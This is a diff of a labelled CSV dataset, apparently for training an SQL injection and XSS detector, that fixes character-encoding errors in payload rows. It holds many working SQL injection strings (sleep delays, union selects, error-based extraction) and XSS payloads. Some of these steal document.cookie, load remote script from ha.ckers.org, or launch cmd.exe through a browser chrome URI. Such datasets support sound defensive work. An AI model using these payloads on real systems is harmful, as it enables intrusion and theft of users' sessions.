 "1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",sqli
@@ -9127,7 +9127,7 @@ palazuelos de eresma,benign
 2.11E+15,benign
 "<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
 6928,benign
-_script_alert(�XSS�)_/script_,xss
+¼script¾alert(¢XSS¢)¼/script¾,xss
 ashberry,benign
 "1""   )    )    as azak where 4911  =  4911",sqli
 &lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
@@ -9335,7 +9335,7 @@ castellol,benign
 -8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'xopg'  =  'xopg,sqli
 "<img src=""javascript:alert('XSS')"">",xss
 torres de berrelln,benign
-�><s�%2b�cript>alert(document.cookie)</script>,xss
+“><s”%2b”cript>alert(document.cookie)</script>,xss
 "1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
 "SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 28313,28341 ) ",sqli
 &lt;? echo('&lt;SCR)';,xss
@@ -9381,7 +9381,7 @@ aguilar de bureba,benign
 "1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""usht"" like ""usht",sqli
 SELECT those FROM rear,sqli
 "<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss
-"<math href=""javascript:javascript:alert(1)"">CLICKME</math>� <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
+"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
 SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/reset_password.php' ORDER BY wp_posts.post_title ASC,sqli
 "1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
 "1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'cotv' like 'cotv",sqli
@@ -9484,7 +9484,7 @@ agalladura,benign
 "`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
 1'   )    )    waitfor delay '0:0:5' and    (    (   'jcfe'  =  'jcfe,sqli
 hlinka,benign
-"�<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
+" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
 SELECT * FROM with WHERE loose = 'have' FETCH FIRST 3 ROWS ONLY,sqli
 &lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;,xss
 lorain-ligero@mareventsprotocolosocial.tn,benign
@@ -9562,7 +9562,7 @@ benchley@11horas.fk,benign
 "1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",sqli
 "1%'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
 "<img src=# onerror\x3D""javascript:alert(1)"" >",xss
-_script_alert(�XSS�)_/script_,xss
+¼script¾alert(¢XSS¢)¼/script¾,xss
 "&alphabet=""><script>alert(String.fromCharCode(88,83,83))</script>",xss
 34310,benign
 "`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",xss
@@ -9601,7 +9601,7 @@ castellanos de moriscos,benign
 lorraine,benign
 macedonia 48,benign
 -7600' or 7684  =  3181#,sqli
-"�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�></SCRIPT>�>�><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
+"‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
 lleida,benign
 "<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
 SELECT agree FROM sink UNION SELECT brown FROM ill ORDER BY describe,sqli
@@ -9661,7 +9661,7 @@ d75a4r45der,benign
 "call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",sqli
 <script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,xss
 nina,benign
-"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> _",xss
+"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​",xss
 "1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",sqli
 "-7551 or elt  (  6900  =  7195,7195  )  ",sqli
 26562587w,benign
@@ -10032,7 +10032,7 @@ SELECT TOP 3 * FROM round SELECT * FROM pig 3SELECT * FROM pan,sqli
 "<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 &lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;,xss
 sagunto/sagunt,benign
-"<IMG SRC="" &#14;� javascript:alert('XSS');"">",xss
+"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
 """`'><script>\xE2\x80\xA8javascript:alert(1)</script>",xss
 masferr massans,benign
 7.97E+15,benign
@@ -10174,7 +10174,7 @@ franchetti.martinsan@elsentidodelavida.qa,benign
 "-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#",sqli
 "<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 "1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",sqli
-<style>*{x:__________(javascript:alert(1))}</style>,xss
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
 8e35o502da7,benign
 "navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)",xss
 "1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""jyad""  =  ""jyad",sqli
@@ -10209,7 +10209,7 @@ SELECT * FROM yourself  WHERE planet = buy,sqli
 20542773r,benign
 "1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",sqli
 "-2230%"" union all select 3303,3303,3303--",sqli
-"<IMG SRC="" &#14;� javascript:alert('XSS');"">",xss
+"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
 18243165w,benign
 halpin,benign
 SELECT Count ( * )  AS DistinctCountries,sqli
@@ -10529,7 +10529,7 @@ refriega,benign
 "-2840'   )    )     )   union all select 3025,3025,3025,3025--",sqli
 93tip72ar,benign
 suen,benign
-<IMG ���><SCRIPT>alert(�XSS�)</SCRIPT>�>,xss
+<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,xss
 on,benign
 13440,benign
 <!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,xss
@@ -10572,7 +10572,7 @@ SELECT COUNT ( money ) FROM center,sqli
 "<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
 -5694   )    )    as cxnb where 6858  =  6858 or 9323  =  9323#,sqli
 &teamno=&type=%22%3E%3Cscript%3Ealert%28%270%27%29;%3C/script%3E,xss
-"<IMG SRC="" &#14;� javascript:alert('XSS');"">",xss
+"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
 &#60;LINK REL&#61;&#34;stylesheet&#34; HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
 "1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",sqli
 vai@sexplorador.mk,benign
@@ -11141,7 +11141,7 @@ pillars4,benign
 "1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",sqli
 DELETE FROM favorite WHERE tobacco = 'standard',sqli
 "1"" union all select null,null,null,null,null,null,null#",sqli
-"  SELECT RTRIM ( ""SQL Tutorial     "" )  AS RightTrimmedString; ",sqli
+"  SELECT RTRIM ( ""SQL Tutorial¬†¬†¬†¬† "" )  AS RightTrimmedString; ",sqli
 "1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""jywy"" like ""jywy",sqli
 <// style=x:expression\28javascript:alert(1)\29>,xss
 virella altimirs,benign
@@ -11224,7 +11224,7 @@ piedramillera,benign
 "1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",sqli
 63298862x,benign
 novelador,benign
-"�<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ____________",xss
+" <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ​​​​​​​​​​​​",xss
 "-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",sqli
 &#60;BODY ONLOAD&#61;alert&#40;&#39;XSS&#39;&#41;&#62;,xss
 " SELECT * FROM held ORDER BY today, mistake",sqli
@@ -11913,7 +11913,7 @@ archie,benign
 shing-mi,benign
 22115972t,benign
 c28a3iz8,benign
-�><<script>alert(document.cookie);//<</script>,xss
+“><<script>alert(document.cookie);//<</script>,xss
 patay,benign
 gaetano,benign
 venancia,benign
@@ -12003,7 +12003,7 @@ rosngela,benign
 " SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = ""Around the Horn"" AND c.CustomerID = o.CustomerID;",sqli
 "1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",sqli
 "'""></title><script>alert(1111)</script>",xss
-"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> _",xss
+"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ​",xss
 "<;HEAD>;<;META HTTP-EQUIV="";CONTENT-TYPE""; CONTENT="";text/html; charset=UTF-7"";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-",xss
 jaspe ochoa,benign
 "select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  '%'  =  '",sqli
@@ -12161,7 +12161,7 @@ perr@pasajesaereosbaratos.pm,benign
 1   )    )    as smtf where 5829  =  5829,sqli
 "1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""zptu""  =  ""zptu",sqli
 legarreta sant,benign
-"�<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
+" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
 calle gurugu 142 4?d,benign
 "1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'vjkf' like 'vjkf",sqli
 </textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>,xss
@@ -12496,7 +12496,7 @@ trilles aedo,benign
 "1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",sqli
 SELECT AVG ( rice ) FROM car,sqli
 "-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",sqli
-"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF�",xss
+"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
 50269,benign
 select   (  case when   (  3444  =  8424  )   then 3444 else 3444*  (  select 3444 from information_schema.character_sets  )   end  )  #,sqli
 1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,sqli
@@ -12766,7 +12766,7 @@ maheu,benign
 "1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
 3.24E+15,benign
 &search=%3Cobject+width%3D%22425%22+height%3D%22344%22%3E%3Cparam+name%3D%22movie%22+value%3D%22http://www.youtube.com/v/0Bmhjf0rKe8%26color1%3D0xb1b1b1%26color2%3D0xcfcfcf%26hl%3Dnl_NL%26feature%3Dplayer_embedded%26fs%3D1%22%3E%3C/param%3E%3Cparam+name%3D%22allowFullScreen%22+value%3D%22true%22%3E%3C/param%3E%3Cparam+name%3D%22allowScriptAccess%22+value%3D%22always%22%3E%3C/param%3E%3Cembed+src%3D%22http://www.youtube.com/v/0Bmhjf0rKe8%26color1%3D0xb1b1b1%26color2%3D0xcfcfcf%26hl%3Dnl_NL%26feature%3Dplayer_embedded%26fs%3D1%26autoplay%3D1%22+type%3D%22application/x-shockwave-flash%22+allowfullscreen%3D%22true%22+allowScriptAccess%3D%22always%22+width%3D%22425%22+height%3D%22344%22%3E%3C/embed%3E%3C/object%3E&submit.x=0&submit.y=0,xss
-�; alert(document.cookie); var foo=�,xss
+‘; alert(document.cookie); var foo=’,xss
 "<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
 "select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli
 "-1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",sqli
@@ -12921,7 +12921,7 @@ pearce,benign
 1 where 9361  =  9361 and 7478  =  9170--,sqli
 """`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",xss
 stiven,benign
-"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF�",xss
+"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",xss
 juglandea,benign
 "<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
 fontanal callarisa,benign
@@ -13142,10 +13142,10 @@ mara,benign
 "1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
 "-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",sqli
 "SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 189 )  ORDER BY meta_id ASC",sqli
-"'`""><\x3Cscript>javascript:alert(1)</script> � � � �",xss
+"'`""><\x3Cscript>javascript:alert(1)</script>        ",xss
 "caada de los ingleses, 117,",benign
 torrescrcela,benign
-"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>_",xss
+"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>​",xss
 shangtia,benign
 &query=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E&x=0&y=0,xss
 "`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",xss
@@ -13251,7 +13251,7 @@ villadecanes,benign
 gibezzi scampini,benign
 carminante,benign
 SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,sqli
-"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>_",xss
+"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​",xss
 niemyska@inversioneolica.lt,benign
 1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,sqli
 <script\x0A>javascript:alert(1)</script>,xss
@@ -13302,7 +13302,7 @@ hierros 161 10f,benign
 1272,benign
 33279,benign
 &WRD='%20|%20alert%28'XSS'%29%20|%20'&ern=200,xss
-"&lt;IMG SRC=\"" � javascript&#058;alert('XSS');\""&gt;",xss
+"&lt;IMG SRC=\""   javascript&#058;alert('XSS');\""&gt;",xss
 <script\x0A>javascript:alert(1)</script>,xss
 "<IMG onmouseover=""alert('xxs')"">",xss
 2.97E+15,benign
@@ -13515,7 +13515,7 @@ arre,benign
 "1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
 albacete,benign
 "<img src\x11=x onerror=""javascript:alert(1)"">",xss
-"<iframe� src=""&Tab;javascript:prompt(1)&Tab;"">",xss
+"<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",xss
 46725,benign
 "1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",sqli
 aguzadera,benign
@@ -13534,7 +13534,7 @@ aguzadera,benign
 "<form><isindex formaction=""javascript&colon;confirm(1)""",xss
 "-9820"" or 1038  =  7502#",sqli
 SELECT * FROM clear WHERE slipped = 'building'  OR aware = 'colony',sqli
-"<div id=""x"">XXX</div> <style>� #x{font-family:foo[bar;color:green;}� #y];color:red;{}� </style>",xss
+"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
 rogan-darrieux@rocofer.tc,benign
 "<img\x10src=x onerror=""javascript:alert(1)"">",xss
 """><img src=x onerror=window.open('https://www.google.com/');>",xss
@@ -13546,7 +13546,7 @@ at89a7218,benign
 """`'><script>\x20javascript:alert(1)</script>",xss
 charlebois3@nanotecnologo.np,benign
 car52lit7,benign
-"'`""><\x3Cscript>javascript:alert(1)</script> � � � �",xss
+"'`""><\x3Cscript>javascript:alert(1)</script>        ",xss
 naut aran,benign
 24892,benign
 99999464h,benign
@@ -13557,7 +13557,7 @@ handy.leleu@chevrolet-volt.gob,benign
 "1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",sqli
 adams@11horas.ng,benign
 "<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
-" SELECT CustomerName, City, Country FROM Customers ORDER BY  ( CASE     WHEN City IS NULL THEN Country     ELSE City END ) ;",sqli
+" SELECT CustomerName, City, Country FROM Customers ORDER BY  ( CASE ¬†¬†¬† WHEN City IS NULL THEN Country ¬†¬†¬† ELSE City END ) ;",sqli
 """<meta http-equiv=""""refresh"""" content=""""0;url=javascript:document.write(""""XSS-XSS-XSS"""");"""">""",xss
 "1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'hryb'  =  'hryb",sqli
 "-3758'   )    )    union all select 9460,9460,9460,9460,9460,9460,9460,9460--",sqli
@@ -13593,7 +13593,7 @@ whiskin,benign
 """`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>",xss
 pampanas soto,benign
 apo695169or6,benign
-"<IMG SRC=""jav� � ascript:javascript:alert(1);"">",xss
+"<IMG SRC=""jav    ascript:javascript:alert(1);"">",xss
 "1"" where 5977  =  5977",sqli
 crovetto roger,benign
 SELECT * FROM language WHERE circus NOT LIKE '[declared]%',sqli
@@ -13701,7 +13701,7 @@ llanes,benign
 03331390r,benign
 poca urzagaste,benign
 1'  )   as hcpp where 1863  =  1863,sqli
-�><ScRiPt>alert(document.cookie)</script>,xss
+“><ScRiPt>alert(document.cookie)</script>,xss
 miramar,benign
 "SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  ""Brazil""; DROP VIEW [Brazil Customers];",sqli
 " SELECT COUNT ( CustomerID ) , Country FROM Customers GROUP BY Country;",sqli
@@ -13948,7 +13948,7 @@ cote suengas,benign
 "-9096""  )   where 9452  =  9452 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",sqli
 1'+  (  select mhfn where 2425  =  2425,sqli
 "1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",sqli
-<style>*{x:__________(javascript:alert(1))}</style>,xss
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
 "1%""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,sqli
 "-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",sqli
 1'+  (  select lptb where 3861  =  3861 or sleep  (  5   )    )   +',sqli
@@ -14075,7 +14075,7 @@ chilches/xilxes,benign
 "-9361""   )    )    union all select 3112#",sqli
 -2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,sqli
 SELECT * FROM escape WHERE everybody = 'action' LIMIT 3,sqli
-"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF�",xss
+"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
 "1%""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,sqli
 4.77E+15,benign
 "<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
@@ -14128,7 +14128,7 @@ sabiela,benign
 1'  )   where 7903  =  7903,sqli
 &search=<body onload=alert%28%22XSS%22%29>&x=0&y=0,xss
 fonterosa vjar,benign
-<iframe� src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
 pent0et3o,benign
 -3297' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,sqli
 "1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",sqli
@@ -14489,7 +14489,7 @@ sant andreu de la barca,benign
 "exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",sqli
 "1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",sqli
 SELECT * FROM town WHERE industrial = 'under'  AND City = 'mill',sqli
-"    SELECT column1, column2,...     FROM existing_table_name     WHERE ....; CREATE TABLE TestTable AS ",sqli
+"¬†¬†¬† SELECT column1, column2,... ¬†¬†¬† FROM existing_table_name ¬†¬†¬† WHERE ....; CREATE TABLE TestTable AS ",sqli
 valido casademont,benign
 "-9977"" where 5132  =  5132 union all select 5132--",sqli
 "-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",sqli
@@ -14578,7 +14578,7 @@ urbon,benign
 SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_file_sync_1_process_lock' LIMIT 1,sqli
 agujer4e2o,benign
 42093532j,benign
-" SELECT OrderID, Quantity, CASE     WHEN Quantity > 30 THEN 'The quantity is greater than 30'     WHEN Quantity  =  30 THEN 'The quantity is 30'     ELSE 'The quantity is under 30' END AS QuantityText FROM OrderDetails;",sqli
+" SELECT OrderID, Quantity, CASE ¬†¬†¬† WHEN Quantity > 30 THEN 'The quantity is greater than 30' ¬†¬†¬† WHEN Quantity  =  30 THEN 'The quantity is 30' ¬†¬†¬† ELSE 'The quantity is under 30' END AS QuantityText FROM OrderDetails;",sqli
 <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,xss
 "<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",xss
 "1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
@@ -15139,7 +15139,7 @@ guilas,benign
 1'  )   as chla where 6098  =  6098,sqli
 -5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,sqli
 &lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;,xss
-_script_alert(�XSS�)_/script_,xss
+¼script¾alert(¢XSS¢)¼/script¾,xss
 "c/ echegaray s/n,",benign
 1'||  (  select 'aevx' from dual where 9999  =  9999,sqli
 "1"" where 9919  =  9919",sqli
@@ -15190,7 +15190,7 @@ rakin,benign
 hinson,benign
 """`'><script>\xE2\x80\x83javascript:alert(1)</script>",xss
 %3cscript%3ealert(document.cookie);%3c%2fscript%3e,xss
-"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF�",xss
+"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",xss
